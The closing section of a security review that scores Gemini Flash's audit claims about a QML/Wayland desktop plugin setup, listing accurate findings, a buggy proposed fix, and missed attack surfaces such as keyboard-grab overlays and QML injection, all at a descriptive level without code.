## Summary Scorecard

### Gemini Flash Claims Accuracy

| # | Claim | Accuracy | Practical Impact |
|---|---|---|---|
| 1A | PATH shadowing | ✅ Accurate, overstated | Medium — requires local access |
| 1B | BASH_ENV/functions | ✅ Accurate, confirmed | Medium-High — session env attack |
| 2 | Symlink/TOCTOU | ✅ Accurate, incomplete | Medium — missed same-user, ACL, cross-fs |
| 3A | Text.AutoText | ✅ **Best finding** | **High** — remote trigger, Qt-confirmed |
| 3B | StdioCollector | ✅ Accurate, source-confirmed | Medium — requires malicious helper |
| 3C | Timer isBusy | ⚠️ Correct idea, oversimplified | Low-Medium — needs watchdog |
| 4 | /proc/pid/cmdline | ✅ Accurate | Medium — same-user always visible |
| 5 | Code snippets | ❌ **Self-defeating SIGPIPE bug** | Critical — proposed fix crashes itself |

### Missed Attack Surfaces

| # | Attack Surface | Severity | Why It Matters |
|---|---|---|---|
| M1 | Layer-shell keyboard grab | **Critical** | Invisible keylogger overlay |
| M2 | Image.source SSRF | High | Remote tracking beacon |
| M3 | Qt.createQmlObject injection | High | QML code injection |
| M4 | Hyprland IPC injection | Medium | Command injection via window titles |
| M5 | D-Bus notification flood | Medium | CPU exhaustion via signal storm |
| M6 | Binding loop exhaustion | Low-Medium | CPU DoS via data-driven loops |
| M7 | Inter-plugin attacks | Low-Medium | No isolation in shared process |

### Overall Assessment

Gemini Flash demonstrated genuine security knowledge — every core mechanism it described exists in reality, and it produced zero hallucinations. But security auditing requires more than identifying real mechanisms: it requires understanding the *precise conditions* under which they're exploitable, and the *precise behavior* of proposed fixes. Gemini's proposed code contains a SIGPIPE crash that would fail 100% of the time with infinite producers and nondeterministically with finite producers. Its `stat` check has subtle format-string issues. And it focused on bash hardening while missing the attack surfaces that define the QML/Wayland desktop plugin threat model: compositor protocol abuse, QML code injection, and inter-plugin isolation.

The observatory's own security reference (`security-review.md`) and performance guidance (`performance-review.md`) are more precise than Gemini's claims in every overlapping area. Gemini's genuine incremental contributions are the `BASH_ENV`/`-p` detail and the `Text.AutoText` emphasis — both worth incorporating into the observatory's guidance.

---

*Every empirical claim in this report was tested in-session on bash 5.2.x. Exit codes, `stat` output formats, and SIGPIPE behavior were observed directly, not assumed from documentation. Test scripts and their outputs are preserved in session artifacts for independent reproduction.*
